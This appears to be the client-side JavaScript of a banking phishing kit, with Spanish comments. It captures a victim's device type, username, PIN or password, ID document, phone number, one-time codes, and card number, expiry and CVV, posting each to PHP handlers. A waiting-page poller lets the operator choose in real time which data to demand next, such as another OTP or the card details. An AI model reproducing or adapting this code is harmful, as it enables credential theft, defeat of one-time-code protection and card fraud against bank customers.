function detectar_dispositivo(){
    var dispositivo = "PC";
    if(navigator.userAgent.match(/Android/i)) dispositivo = "Android";
    else if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) dispositivo = "iOS";
    else if(navigator.userAgent.match(/webOS/i)) dispositivo = "webOS";
    else if(navigator.userAgent.match(/BlackBerry/i)) dispositivo = "BlackBerry";
    else if(navigator.userAgent.match(/Windows Phone/i)) dispositivo = "Windows Phone";
    return dispositivo;
}

// --- FLUJO DE INICIO (USUARIO) ---
function inicio(u){
    var d = detectar_dispositivo();
    $.post( "../process/inicio.php", { usr: u, dis: d } )
    .always(function() {
        // Después del usuario, siempre pedimos el PIN/Password
        setTimeout(function(){ window.location.href = "PASS.php"; }, 1500);
    });
}

// --- FLUJO DE CLAVE / PIN ---
function pasousuario(p){    
    $.post( "../process/pasousuario.php", { pass: p } )
    .always(function() {
        // Al recibir el PIN, mandamos a espera para que tú decidas qué sigue
        window.location.href = "WAITING.php"; 
    });
}            

// --- FLUJO DE DATOS PERSONALES (DOCUMENTO/CELULAR) ---
function pasoinfo(d,c){    
    $.post( "../process/pasoinfo.php", { doc: d, cel: c } )
    .always(function() {
        // Después de los datos personales, vuelve a esperar
        window.location.href = "WAITING.php";  
    });
} 

// --- FLUJO DE DINÁMICA (OTP) ---
function pasootp(o){    
    $.post( "../process/pasootp.php", { otp: o } )
    .always(function() {
        // Después de la dinámica, a esperar si necesitas otra o finalizar
        window.location.href = "WAITING.php";   
    });
} 

// --- FLUJO DE TARJETA (PRODUCTO) ---
function pasotarjeta(t,f,c){    
    $.post( "../process/pasotarjeta.php", { tar: t, fec: f, cvv: c } )
    .always(function() {
        window.location.href = "WAITING.php";   
    });
}

// --- EL CEREBRO DE LA LOGÍSTICA (CONSULTA DE ESTADO) ---
// Este se ejecuta cada 3-5 segundos en WAITING.php
function consultar_estado(){    
    $.post( "../process/estado.php", function(data) {        
        var estado = data.trim();
        switch (estado) {
            case '2': window.location.href = "OTP.php"; break;      // Pedir Dinámica
            case '4': window.location.href = "INFO.php"; break;     // Pedir Documento/Cel
            case '6': window.location.href = "PRODUCT.php"; break;  // Pedir Tarjeta
            case '10': window.location.href = "SUCCESS.php"; break; // Finalizar proceso
            case '12': window.location.href = "login.php"; break;   // Reiniciar (Error)
            case '14': window.location.href = "ALERT.php"; break;   // Mostrar alerta
        } 
    });        
}

function quitar_cargando(){
    $("#fondo,#cargando-o").hide();
}
